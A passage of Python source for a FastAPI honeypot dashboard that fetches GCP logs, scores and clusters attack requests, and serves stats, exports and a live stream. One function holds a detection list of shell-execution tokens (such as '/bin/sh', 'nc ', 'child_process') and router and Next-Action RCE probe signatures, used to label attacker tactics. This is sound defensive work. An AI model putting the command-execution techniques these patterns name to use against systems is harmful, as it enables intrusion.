            rec = _build_record_from_dict_and_meta(
                target_dict=target_dict,
                http_req={},
                ts_dt=ts_dt,
                fallback_ip="private",
                fallback_event=str(target_dict.get("event") or "request").lower(),
                source_name=f"bigquery:{BQ_TABLE_ID}",
            )
            if rec is not None:
                records.append(rec)
                if len(records) >= limit:
                    break
    except Exception as exc:
        logger.warning("Failed to fetch logs from BigQuery %s: %s", BQ_TABLE_ID, exc)

    return records[:limit]


def _record_dedup_key(rec: dict[str, Any]) -> str:
    insert_id = str(rec.get("insert_id") or "").strip()
    if insert_id:
        return f"iid:{insert_id}"
    payload_digest = hashlib.sha256(str(rec.get("payload_full") or rec.get("payload") or "").encode("utf-8", errors="ignore")).hexdigest()[:16]
    return f"ts:{rec.get('timestamp')}|ip:{rec.get('ip')}|m:{rec.get('method')}|p:{rec.get('path')}|h:{payload_digest}"


def _fetch_all_entries_sync(
    hours: int,
    limit: int,
    source_mode: str | None = None,
) -> list[dict[str, Any]]:
    effective_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    now_dt = datetime.now(timezone.utc)
    cutoff_dt = None if _is_unbounded_history(hours) else (now_dt - timedelta(hours=hours))
    mode = (source_mode or LOG_SOURCE_MODE or "all").strip().lower()
    combined: list[dict[str, Any]] = []

    if mode in {"all", "both", "logging"}:
        combined.extend(_fetch_cloud_logging_entries_sync(cutoff_dt=cutoff_dt, limit=effective_limit))
    if mode in {"all", "both", "gcs"}:
        combined.extend(_fetch_gcs_entries_sync(now_dt=now_dt, cutoff_dt=cutoff_dt, limit=effective_limit))
    if ENABLE_BIGQUERY_LOGS and mode in {"all", "bigquery"}:
        combined.extend(_fetch_bigquery_entries_sync(cutoff_dt=cutoff_dt, limit=effective_limit))

    deduped: dict[str, dict[str, Any]] = {}
    for rec in combined:
        key = _record_dedup_key(rec)
        deduped.setdefault(key, rec)

    return sorted(deduped.values(), key=lambda r: r["timestamp"], reverse=True)[:effective_limit]


async def fetch_logs_async(
    hours: int,
    limit: int,
    source_mode: str | None = None,
) -> tuple[list[dict[str, Any]], bool]:
    try:
        records = await asyncio.to_thread(_fetch_all_entries_sync, hours, limit, source_mode)
        return records, False
    except Exception as exc:
        logger.warning("Failed to fetch real logs: %s", exc)
        return [], False


def calculate_gcp_costs(log_count: int, total_bytes: int, hours: int) -> dict[str, Any]:
    scale_to_month = (24.0 * 30.0) / max(hours, 1)
    est_monthly_bytes = total_bytes * scale_to_month
    est_monthly_reqs = log_count * scale_to_month

    free_logging_bytes = 50 * (1024**3)
    billable_gib = max(0.0, (est_monthly_bytes - free_logging_bytes) / (1024**3))
    logging_usd = billable_gib * 0.50
    logging_quota_pct = min(100.0, round((est_monthly_bytes / free_logging_bytes) * 100.0, 2))

    free_run_reqs = 2_000_000
    billable_reqs = max(0.0, est_monthly_reqs - free_run_reqs)
    run_usd = (billable_reqs / 1_000_000) * 0.40
    run_quota_pct = min(100.0, round((est_monthly_reqs / free_run_reqs) * 100.0, 2))

    total_usd = round(logging_usd + run_usd, 4)
    return {
        "estimated_monthly_usd": total_usd,
        "estimated_monthly_jpy": round(total_usd * USD_TO_JPY, 1),
        "logging_free_tier_pct": logging_quota_pct,
        "cloud_run_free_tier_pct": run_quota_pct,
        "analyzed_bytes": total_bytes,
    }


def _compute_right_side_analytics(
    timeline_events: list[dict[str, Any]],
    category_counts: dict[str, int],
    cluster_summary: list[dict[str, Any]],
) -> dict[str, Any]:
    """ダッシュボード右側の分析パネル用（カテゴリ・クラスタ・手口/パス・80%以上・時間帯別推移）を集計する。"""
    total_events = len(timeline_events)
    above_80_events = [ev for ev in timeline_events if _safe_int(ev.get("anomaly_score"), 0) >= 80]

    category_breakdown: list[dict[str, Any]] = []
    for cat, cnt in sorted(category_counts.items(), key=lambda x: x[1], reverse=True):
        share = round((cnt / total_events) * 100.0, 1) if total_events > 0 else 0.0
        category_breakdown.append({"category": cat, "count": cnt, "share_pct": share})

    tactic_counter: Counter[str] = Counter()
    path_counter: Counter[str] = Counter()
    hour_counter: Counter[str] = Counter()

    for ev in timeline_events:
        raw_blob = f"{ev.get('path') or ''} {ev.get('payload_full') or ev.get('payload') or ''}".lower()
        method = str(ev.get("method") or "GET").upper()
        clean_path = str(ev.get("path") or "/").split("?")[0]
        path_counter[f"{method} {clean_path[:60]}"] += 1

        if "next-action" in raw_blob:
            tactic_counter["Next-Action RCE Probe"] += 1
        elif "formsyscmd" in raw_blob or "/boaform/" in raw_blob:
            tactic_counter["Boaform / Router RCE"] += 1
        elif any(tok in raw_blob for tok in ("/bin/sh", "/bin/bash", "|sh", "| sh", "nc ", "child_process", "spawn(")):
            tactic_counter["Shell / Command Exec"] += 1
        else:
            tactic_counter[str(ev.get("category") or "Other Anomaly")] += 1

        ts_str = str(ev.get("timestamp") or "")
        if len(ts_str) >= 13:
            hour_counter[ts_str[:13].replace("T", " ") + ":00"] += 1

    hourly_trend = [
        {"hour": h, "count": c}
        for h, c in sorted(hour_counter.items(), key=lambda x: x[0])[-12:]
    ]

    top_tactics = [
        {
            "tactic": name,
            "count": cnt,
            "share_pct": round((cnt / total_events) * 100.0, 1) if total_events > 0 else 0.0,
        }
        for name, cnt in tactic_counter.most_common(6)
    ]

    top_paths = [
        {"endpoint": ep, "count": cnt}
        for ep, cnt in path_counter.most_common(6)
    ]

    high_80_items = [
        {
            "id": ev.get("id"),
            "timestamp": ev.get("timestamp"),
            "ip": ev.get("ip"),
            "flag": ev.get("flag"),
            "country": ev.get("country"),
            "category": ev.get("category"),
            "anomaly_score": ev.get("anomaly_score"),
            "cluster_label": ev.get("cluster_label"),
            "attack_summary": ev.get("attack_summary"),
            "method": ev.get("method"),
            "path": ev.get("path"),
        }
        for ev in above_80_events[:25]
    ]

    return {
        "anomaly_min_threshold": ANOMALY_SCORE_THRESHOLD,
        "above_80_count": len(above_80_events),
        "above_80_share_pct": round((len(above_80_events) / total_events) * 100.0, 1) if total_events > 0 else 0.0,
        "above_80_events": high_80_items,
        "category_breakdown": category_breakdown,
        "cluster_breakdown": cluster_summary,
        "top_tactics": top_tactics,
        "top_paths": top_paths,
        "hourly_trend": hourly_trend,
    }


async def build_stats_payload(
    hours: int,
    limit: int,
    source_mode: str | None = None,
) -> dict[str, Any]:
    effective_hours = min(max(int(hours), 1), MAX_QUERY_HOURS)
    effective_limit = min(max(int(limit), 1), MAX_ALLOWED_LIMIT)
    effective_mode = (source_mode or LOG_SOURCE_MODE or "all").strip().lower()
    cache_key = (
        SHOW_ALL_HISTORY,
        effective_hours,
        effective_limit,
        effective_mode,
        tuple(LOG_PROJECTS),
        tuple(LOG_GCS_BUCKETS),
        BQ_TABLE_ID,
        ENABLE_BIGQUERY_LOGS,
        LOG_SOURCE_MODE,
        LOG_FILTER,
        LOG_GCS_PREFIX,
        MAX_GCS_BLOBS,
        SHOW_ALL_JSON,
        MAX_DISPLAY_TEXT_LEN,
        SKIP_JAPAN_IPS,
        SKIP_CRAWLERS,
        SKIP_GOOGLE_LLC,
        SKIP_PRIVATE_IPS,
        SKIP_SYSTEM_NOISE,
        EXCLUDE_AUDIT_AND_ADMIN_LOGS,
        tuple(sorted(ADMIN_IPS)),
        tuple(sorted(ADMIN_EMAILS)),
        UNSUPERVISED_CLUSTERS,
        MAX_UNSUPERVISED_CLUSTERS,
        HIDE_AUTOMATED_RECON,
        ANOMALY_SCORE_THRESHOLD,
    )
    now_mono = time.monotonic()
    cached = LOG_RESPONSE_CACHE.get(cache_key)
    if cached is not None:
        cached_at, cached_payload = cached
        if (now_mono - cached_at) < LOG_CACHE_TTL:
            LOG_RESPONSE_CACHE.move_to_end(cache_key)
            _save_ips_txt_if_enabled(collect_detected_ips(cached_payload))
            return cached_payload

    raw_records, is_demo_mode = await fetch_logs_async(
        hours=effective_hours,
        limit=effective_limit,
        source_mode=effective_mode,
    )
    geo_map = await resolve_geoip_batch([r["ip"] for r in raw_records])

    anomalous_items: list[tuple[dict[str, Any], dict[str, Any], str, str, float, int, dict[str, Any]]] = []
    host_counter: Counter[str] = Counter()

    for rec in raw_records:
        ip = rec["ip"]
        geo = _normalize_geo_entry(geo_map.get(ip), ip=ip)

        if _is_audit_or_admin_log(ip, rec.get("payload_full") or rec.get("payload", ""), rec.get("user_agent", "")):
            continue
        if SKIP_PRIVATE_IPS and _is_private_or_non_public_ip(ip, geo):
            continue
        if SKIP_GOOGLE_LLC and _is_google_llc(geo, rec.get("user_agent", ""), rec.get("payload_full") or rec.get("payload", "")):
            continue
        if SKIP_JAPAN_IPS and _is_japan_geo(geo):
            continue

        category, confidence, anomaly_score, stats_meta = classify_and_score(
            event_type=rec.get("event_type", "request"),
            method=rec["method"],
            path=rec["path"],
            payload=rec.get("payload_full") or rec["payload"],
            user_agent=rec["user_agent"],
            raw_request_line=rec.get("raw_request_line", ""),
            header_count=rec["header_count"],
        )

        if not _is_anomalous_event(category, anomaly_score, rec.get("event_type", "")):
            continue

        display_country = sanitize_display_text(f"{geo['country_ja']} ({geo['country']})", max_len=160)
        host = _extract_host_from_record(rec)
        if host:
            host_counter[host] += 1

        anomalous_items.append((rec, geo, display_country, category, confidence, anomaly_score, stats_meta))

    cluster_assignments, cluster_summary = run_unsupervised_clustering(
        [item[0] for item in anomalous_items],
        host_burst_map=dict(host_counter),
    )

    category_counts: dict[str, int] = {}
    cluster_counts: dict[str, int] = {}
    country_counts: dict[str, dict[str, Any]] = {}
    ip_counts: dict[str, dict[str, Any]] = {}
    timeline_events: list[dict[str, Any]] = []
    all_json_records: list[dict[str, Any]] = []

    total_bytes = 0
    high_anomaly_count = 0

    for idx, (rec, geo, display_country, category, confidence, anomaly_score, stats_meta) in enumerate(anomalous_items):
        ip = rec["ip"]
        total_bytes += rec["bytes"]

        if anomaly_score >= 75:
            high_anomaly_count += 1

        cl_info = cluster_assignments[idx] if idx < len(cluster_assignments) else {
            "cluster_id": 0,
            "cluster_label": "C1: General",
            "cluster_distance": 0.0,
            "cluster_features": {},
        }
        cluster_label = cl_info["cluster_label"]
        attack_summary, attack_summary_en, analysis_basis = build_attack_explanation(
            category=category,
            confidence=confidence,
            anomaly_score=anomaly_score,
            cluster_label=cluster_label,
            stats_meta=stats_meta,
            cluster_features=cl_info.get("cluster_features"),
        )

        category_counts[category] = category_counts.get(category, 0) + 1
        cluster_counts[cluster_label] = cluster_counts.get(cluster_label, 0) + 1

        c_key = f"{geo['flag']} {display_country}"
        country_counts.setdefault(
            c_key,
            {
                "label": c_key,
                "flag": geo["flag"],
                "country": display_country,
                "country_ja": geo["country_ja"],
                "country_en": geo["country"],
                "country_code": geo["country_code"],
                "count": 0,
            },
        )["count"] += 1

        ip_counts.setdefault(
            ip,
            {
                "ip": ip,
                "flag": geo["flag"],
                "country": display_country,
                "country_ja": geo["country_ja"],
                "country_en": geo["country"],
                "country_code": geo["country_code"],
                "isp": geo["isp"],
                "count": 0,
                "top_category": category,
                "top_cluster": cluster_label,
                "top_summary": attack_summary,
            },
        )["count"] += 1

        if len(timeline_events) < min(MAX_TIMELINE_EVENTS, effective_limit):
            safe_path = sanitize_display_text(rec["path"], max_len=0)
            safe_payload = sanitize_display_text(rec["payload"], max_len=0)
            safe_payload_full = sanitize_display_text(rec.get("payload_full") or rec["payload"], max_len=0)
            safe_pretty = sanitize_display_text(rec.get("raw_json_pretty") or safe_payload, max_len=0)
            safe_pretty_full = sanitize_display_text(
                rec.get("raw_json_pretty_full") or rec.get("raw_json_pretty") or safe_payload_full,
                max_len=0,
            )
            event_id = sanitize_display_text(
                f"{rec['timestamp']}_{len(timeline_events)}_{ip}_{rec['method']}_{safe_path[:120]}"
            )
            event_obj = {
                "id": event_id,
                "timestamp": rec["timestamp"],
                "source": rec.get("source", "unknown"),
                "ip": ip,
                "flag": geo["flag"],
                "country": display_country,
                "country_ja": geo["country_ja"],
                "country_en": geo["country"],
                "country_code": geo["country_code"],
                "isp": geo["isp"],
                "method": rec["method"],
                "path": safe_path,
                "payload": safe_payload,
                "payload_full": safe_payload_full,
                "raw_json": rec.get("raw_json"),
                "raw_json_pretty": safe_pretty,
                "raw_json_pretty_full": safe_pretty_full,
                "category": category,
                "confidence": confidence,
                "anomaly_score": anomaly_score,
                "attack_summary": attack_summary,
                "attack_summary_en": attack_summary_en,
                "analysis_basis": analysis_basis,
                "cluster_id": cl_info["cluster_id"],
                "cluster_label": cluster_label,
                "cluster_distance": cl_info["cluster_distance"],
            }
            timeline_events.append(event_obj)
            all_json_records.append(
                {
                    "id": event_id,
                    "timestamp": rec["timestamp"],
                    "source": rec.get("source", "unknown"),
                    "ip": ip,
                    "flag": geo["flag"],
                    "country": display_country,
                    "category": category,
                    "anomaly_score": anomaly_score,
                    "attack_summary": attack_summary,
                    "attack_summary_en": attack_summary_en,
                    "analysis_basis": analysis_basis,
                    "cluster_id": cl_info["cluster_id"],
                    "cluster_label": cluster_label,
                    "json": rec.get("raw_json"),
                    "json_pretty": safe_pretty,
                    "json_pretty_full": safe_pretty_full,
                }
            )

    right_analytics = _compute_right_side_analytics(
        timeline_events=timeline_events,
        category_counts=category_counts,
        cluster_summary=cluster_summary,
    )

    payload = {
        "updated_at": datetime.now(timezone.utc).isoformat(),
        "is_demo_mode": is_demo_mode,
        "show_all_json": SHOW_ALL_JSON,
        "show_all_history": SHOW_ALL_HISTORY,
        "unbounded_history": _is_unbounded_history(effective_hours),
        "only_anomalous": True,
        "anomaly_min_threshold": ANOMALY_SCORE_THRESHOLD,
        "hide_automated_recon": HIDE_AUTOMATED_RECON,
        "exclude_audit_and_admin_logs": EXCLUDE_AUDIT_AND_ADMIN_LOGS,
        "display_mode": "flag_and_country_only",
        "summary": {
            "total_attacks": len(timeline_events),
            "unique_ips": len(ip_counts),
            "unique_countries": len(country_counts),
            "high_anomaly_count": high_anomaly_count,
            "above_80_count": right_analytics["above_80_count"],
            "unsupervised_clusters": len(cluster_summary),
        },
        "categories": category_counts,
        "clusters": cluster_counts,
        "cluster_summary": cluster_summary,
        "right_analytics": right_analytics,
        "top_countries": sorted(country_counts.values(), key=lambda x: x["count"], reverse=True)[:10],
        "top_ips": sorted(ip_counts.values(), key=lambda x: x["count"], reverse=True)[:10],
        "timeline": timeline_events,
        "all_json_records": all_json_records,
        "cost": calculate_gcp_costs(len(timeline_events), total_bytes, effective_hours),
    }

    _save_ips_txt_if_enabled(collect_detected_ips(payload))

    LOG_RESPONSE_CACHE[cache_key] = (time.monotonic(), payload)
    LOG_RESPONSE_CACHE.move_to_end(cache_key)
    while len(LOG_RESPONSE_CACHE) > MAX_LOG_CACHE_ENTRIES:
        LOG_RESPONSE_CACHE.popitem(last=False)
    return payload


@asynccontextmanager
async def lifespan(app: FastAPI):
    os.environ.setdefault("GRPC_VERBOSITY", os.getenv("GRPC_VERBOSITY", "ERROR").strip() or "ERROR")
    os.environ.setdefault("GRPC_TRACE", os.getenv("GRPC_TRACE", "").strip())
    try:
        init_ml_models()
    except Exception as exc:
        logger.exception("ML model initialization failed during startup: %s", exc)
    yield


app = FastAPI(title="Honeypot Threat Intelligence Dashboard (Realtime)", lifespan=lifespan)

if ALLOWED_ORIGINS:
    app.add_middleware(
        CORSMiddleware,
        allow_origins=ALLOWED_ORIGINS,
        allow_methods=["GET"],
        allow_headers=["Content-Type"],
    )


def _build_csp_header(path: str, script_nonce: str) -> str:
    if path in {"/json", "/all-json"}:
        return (
            "default-src 'self'; "
            f"script-src 'self' 'nonce-{script_nonce}'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data:; "
            "connect-src 'self'; "
            "object-src 'none'; "
            "base-uri 'none'; "
            "frame-ancestors 'none';"
        )
    return (
        "default-src 'self'; "
        "script-src 'self' https://cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: blob:; "
        "connect-src 'self'; "
        "font-src 'self' data:; "
        "object-src 'none'; "
        "base-uri 'none'; "
        "frame-ancestors 'none';"
    )


@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    nonce = secrets.token_urlsafe(16)
    request.state.csp_nonce = nonce
    response = await call_next(request)
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("X-Frame-Options", "DENY")
    response.headers.setdefault("Referrer-Policy", "no-referrer")
    response.headers.setdefault("Content-Security-Policy", _build_csp_header(request.url.path, nonce))
    return response


STATIC_ROOT = Path(__file__).resolve().parent / "static"
if STATIC_ROOT.is_dir():
    app.mount("/static", StaticFiles(directory=str(STATIC_ROOT)), name="static")


def _resolve_static_file(filename: str) -> Path:
    if not STATIC_ROOT.is_dir():
        raise HTTPException(status_code=404, detail="Static directory not found")
    candidate = (STATIC_ROOT / filename).resolve()
    if not candidate.is_relative_to(STATIC_ROOT.resolve()) or not candidate.is_file():
        raise HTTPException(status_code=404, detail="Not found")
    return candidate


@app.get("/")
async def serve_index() -> FileResponse:
    index_path = STATIC_ROOT / "index.html"
    if STATIC_ROOT.is_dir() and index_path.is_file():
        return FileResponse(_resolve_static_file("index.html"))
    raise HTTPException(status_code=404, detail="index.html not found")


@app.get("/healthz")
async def healthz() -> dict[str, str]:
    return {"status": "ok"}


@app.get("/favicon.ico")
async def favicon() -> Response:
    return Response(status_code=204, headers={"Cache-Control": "public, max-age=86400"})


@app.get("/api/chart/categories.png")
async def get_category_chart_png(
    hours: int = Query(default=8760, ge=1, le=87600),
    limit: int = Query(default=10000, ge=1, le=50000),
) -> Response:
    safe_hours = min(max(hours, 1), MAX_QUERY_HOURS)
    safe_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    payload = await build_stats_payload(hours=safe_hours, limit=safe_limit)
    png_bytes = await asyncio.to_thread(
        render_category_chart_png,
        payload.get("categories", {}),
        f"ML Attack Category Distribution ({safe_hours}h)",
    )
    return Response(
        content=png_bytes,
        media_type="image/png",
        headers={"Cache-Control": "no-cache"},
    )


@app.get("/api/stats")
async def get_stats(
    hours: int = Query(default=8760, ge=1, le=87600),
    limit: int = Query(default=10000, ge=1, le=50000),
) -> dict[str, Any]:
    safe_hours = min(max(hours, 1), MAX_QUERY_HOURS)
    safe_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    return await build_stats_payload(hours=safe_hours, limit=safe_limit)

@app.get("/api/export/log.txt")
async def export_log_txt(
    hours: int = Query(default=8760, ge=1, le=87600),
    limit: int = Query(default=10000, ge=1, le=50000),
) -> Response:
    """1年分（既定8760時間）の異常度80以上ログをプレーンテキスト（log.txt）で配信する。"""
    safe_hours = min(max(hours, 1), MAX_QUERY_HOURS)
    safe_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    payload = await build_stats_payload(hours=safe_hours, limit=safe_limit)
    timeline = payload.get("timeline") if isinstance(payload, dict) else []

    lines: list[str] = []
    if isinstance(timeline, list):
        for ev in timeline:
            if not isinstance(ev, dict):
                continue
            ts = str(ev.get("timestamp") or "")
            ip = str(ev.get("ip") or "")
            country = str(ev.get("country") or "")
            isp = str(ev.get("isp") or "")
            cat = str(ev.get("category") or "")
            cluster = str(ev.get("cluster_label") or "")
            score = ev.get("anomaly_score")
            method = str(ev.get("method") or "")
            path_str = str(ev.get("path") or "")
            summary = str(ev.get("attack_summary") or ev.get("attack_summary_en") or "")
            detail = str(ev.get("payload_full") or ev.get("payload") or "")
            line = (
                f"[{ts}] ip={ip} country={country} isp={isp} "
                f"category={cat} cluster={cluster} anomaly={score}% "
                f"req={method} {path_str} summary={summary} payload={detail}"
            )
            lines.append(line.replace("\r", " ").replace("\n", " "))

    body = "\n".join(lines) + ("\n" if lines else "")
    return Response(
        content=body.encode("utf-8"),
        media_type="text/plain; charset=utf-8",
        headers={
            "Content-Disposition": 'attachment; filename="log.txt"',
            "Cache-Control": "no-cache",
        },
    )

@app.get("/api/export/attacks.jsonl")
async def export_attacks_jsonl(
    hours: int = Query(default=8760, ge=1, le=87600),
    limit: int = Query(default=2000, ge=1, le=50000),
) -> Response:
    safe_hours = min(max(hours, 1), MAX_QUERY_HOURS)
    safe_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    payload = await build_stats_payload(hours=safe_hours, limit=safe_limit)
    events = payload.get("timeline") or []
    jsonl_body = (
        "\n".join(json.dumps(ev, ensure_ascii=False, default=str) for ev in events)
        + ("\n" if events else "")
    )
    filename = f"detected_attacks_{safe_hours}h.jsonl"
    return Response(
        content=jsonl_body.encode("utf-8"),
        media_type="application/x-ndjson; charset=utf-8",
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            "Cache-Control": "no-cache",
        },
    )


@app.get("/api/stream")
async def stream_stats(
    request: Request,
    hours: int = Query(default=8760, ge=1, le=87600),
    limit: int = Query(default=10000, ge=1, le=50000),
) -> StreamingResponse:
    safe_hours = min(max(hours, 1), MAX_QUERY_HOURS)
    safe_limit = min(max(limit, 1), MAX_ALLOWED_LIMIT)
    started_at = time.monotonic()

    async def event_generator() -> AsyncGenerator[str, None]:
        while True:
            if await request.is_disconnected():
                break
            if (time.monotonic() - started_at) >= MAX_STREAM_DURATION_SEC:
                yield "event: end\ndata: {\"reason\": \"max_duration\"}\n\n"
                break
            try:
                payload = await build_stats_payload(hours=safe_hours, limit=safe_limit)
                data_json = json.dumps(payload, ensure_ascii=False, default=str)
                yield f"event: stats\ndata: {data_json}\n\n"
            except Exception as exc:
                logger.warning("SSE stream generation error: %s", exc)
                err_json = json.dumps({"error": "Failed to build stream payload"}, ensure_ascii=False)
                yield f"event: error\ndata: {err_json}\n\n"

            if (time.monotonic() - started_at) >= MAX_STREAM_DURATION_SEC:
                break
            await asyncio.sleep(STREAM_INTERVAL_SEC)

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


@app.get("/environment")
@app.get("/environment.html")
async def serve_environment() -> FileResponse:
    return FileResponse(_resolve_static_file("environment.html"))

def _build_full_export_events(payload: dict[str, Any]) -> list[dict[str, Any]]:
    """省略（…）なしの完全なログ情報・AI解説・元JSONを含むイベント一覧を作成する。"""
    events = payload.get("timeline")
    if not isinstance(events, list):
        return []

    full_events: list[dict[str, Any]] = []
    for ev in events:
        if not isinstance(ev, dict):
            continue
        raw_json_obj = ev.get("raw_json")
        raw_json_full_str = (
            _safe_json_dumps(raw_json_obj, indent=None)
            if raw_json_obj is not None
            else str(ev.get("payload_full") or ev.get("payload") or "")
        )
        raw_json_pretty_str = (
            _safe_json_dumps(raw_json_obj, indent=2)
            if raw_json_obj is not None
            else str(ev.get("raw_json_pretty_full") or ev.get("raw_json_pretty") or "")
        )
        full_item = dict(ev)
        full_item["payload_full"] = str(ev.get("payload_full") or ev.get("payload") or "")
        full_item["raw_json_full_str"] = raw_json_full_str
        full_item["raw_json_pretty_full"] = raw_json_pretty_str
        full_events.append(full_item)
    return full_events


def fetch_attacks_from_gcp(
    hours: int = 8760,
    limit: int = 10000,
    source_mode: str | None = None,
    out_ips: Path | None = None,
    out_attacks: Path | None = None,
) -> dict[str, Any]:
    """Cloud Logging / GCS / BigQuery から攻撃ログを取得・分析し、IPと攻撃データを保存する。"""
    global LOG_SOURCE_MODE, MAX_DISPLAY_TEXT_LEN
    prev_mode = LOG_SOURCE_MODE
    prev_display_len = MAX_DISPLAY_TEXT_LEN
    if source_mode:
        LOG_SOURCE_MODE = source_mode.strip().lower()
    # 保存処理中は文字列切り詰めを無効化して全文を保持する
    MAX_DISPLAY_TEXT_LEN = 0
    try:
        init_ml_models()
        payload = asyncio.run(build_stats_payload(hours=hours, limit=limit))
    finally:
        LOG_SOURCE_MODE = prev_mode
        MAX_DISPLAY_TEXT_LEN = prev_display_len

    ips = collect_detected_ips(payload)
    target_ips_path = out_ips or IPS_TXT_PATH
    target_ips_path.parent.mkdir(parents=True, exist_ok=True)
    target_ips_path.write_text("\n".join(ips) + ("\n" if ips else ""), encoding="utf-8")

    full_events = _build_full_export_events(payload)
    if out_attacks is not None:
        out_attacks.parent.mkdir(parents=True, exist_ok=True)
        if out_attacks.suffix.lower() == ".json":
            out_attacks.write_text(
                json.dumps(full_events, ensure_ascii=False, default=str, indent=2)
                + ("\n" if full_events else ""),
                encoding="utf-8",
            )
        else:
            out_attacks.write_text(
                "\n".join(json.dumps(ev, ensure_ascii=False, default=str) for ev in full_events)
                + ("\n" if full_events else ""),
                encoding="utf-8",
            )

    return {
        "ips": ips,
        "ips_path": str(target_ips_path),
        "attacks_path": str(out_attacks) if out_attacks else None,
        "events": full_events,
        "payload": payload,
    }


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Cloud Logging / GCS / BigQuery から攻撃ログと攻撃元IPを取得して保存"
    )
    parser.add_argument("--hours", type=int, default=8760, help="取得対象の時間幅（既定: 8760）")
    parser.add_argument("--limit", type=int, default=10000, help="最大取得件数（既定: 10000）")
    parser.add_argument(
        "--source",
        type=str,
        default=None,
        choices=["all", "both", "logging", "gcs", "bigquery"],
        help="取得元（未指定時は LOG_SOURCE_MODE を使用）",
    )
    parser.add_argument(
        "--out-ips",
        type=str,
        default=str(IPS_TXT_PATH),
        help="抽出した攻撃元IPを保存する .txt ファイルパス",
    )
    parser.add_argument(
        "--out-attacks",
        type=str,
        default="log.json",
        help="抽出した攻撃ログを保存する .json / .jsonl ファイルパス（空文字で保存しない）",
    )
    args = parser.parse_args()

    attacks_file = Path(args.out_attacks) if args.out_attacks.strip() else None
    result = fetch_attacks_from_gcp(
        hours=args.hours,
        limit=args.limit,
        source_mode=args.source,
        out_ips=Path(args.out_ips),
        out_attacks=attacks_file,
    )
    pl = result["payload"]
    summary = pl.get("summary") or {}
    print(f"攻撃イベント数: {summary.get('total_attacks', 0)} 件")
    print(f"ユニーク攻撃元IP数: {len(result['ips'])} 件 -> {result['ips_path']}")
    if result["attacks_path"]:
        print(f"攻撃ログ保存先: {result['attacks_path']}")
    for ev in (result.get("events") or [])[:10]:
        print(
            f"  [{ev.get('timestamp')}] {ev.get('flag', '')} {ev.get('country', '')} "
            f"{ev.get('ip')} | {ev.get('category')} ({ev.get('anomaly_score')}%) | "
            f"{ev.get('method')} {ev.get('path')} | {ev.get('attack_summary')}"
        )